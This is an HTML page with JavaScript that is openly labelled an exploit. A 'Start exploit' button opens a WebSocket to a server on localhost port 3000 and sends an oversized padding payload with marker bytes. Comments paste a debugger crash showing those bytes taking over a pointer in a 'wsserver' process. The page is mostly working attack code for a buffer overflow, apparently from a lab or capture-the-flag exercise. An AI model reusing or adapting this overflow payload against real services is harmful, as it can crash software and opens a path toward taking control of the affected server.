<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

<button onclick="exploit();">Start exploit</button>

<script>

function message (j) {
    let message = "";
    for (let i = 0; i < j; i++) {
        message += String.fromCharCode((i) % 26 + 65)
    }
    return message;
}

PADDING = String(Array(3787+1-3)) + "AAAABBBB" + "CCCCDDDD" + message(10000)

// Process 33142 stopped
// * thread #3, stop reason = EXC_BAD_ACCESS (code=1, address=0x4242424241414141)
//     frame #0: 0x00000001000066a4 wsserver`WebSocket::connection() const + 12
// wsserver`WebSocket::connection:
// ->  0x1000066a4 <+12>: ldr    w0, [x8]
//     0x1000066a8 <+16>: add    sp, sp, #0x10
//     0x1000066ac <+20>: ret

function exploit() {

    socket = new WebSocket('ws://localhost:' + 3000);

    socket.onerror = e => console.log("[ERROR]", e);
    socket.onmessage =  m => {
        console.info("["+new Date().toString().slice(16, 24)+"] " + m.data + "\n");
    };
    socket.onclose = e => {
        console.log("Disconnected (" + e.code + ")");
        socket = null;
    };
    socket.onopen = async _ => {
        console.log("Connected");
        socket.send(PADDING);
    };

}

</script>

</body>
</html>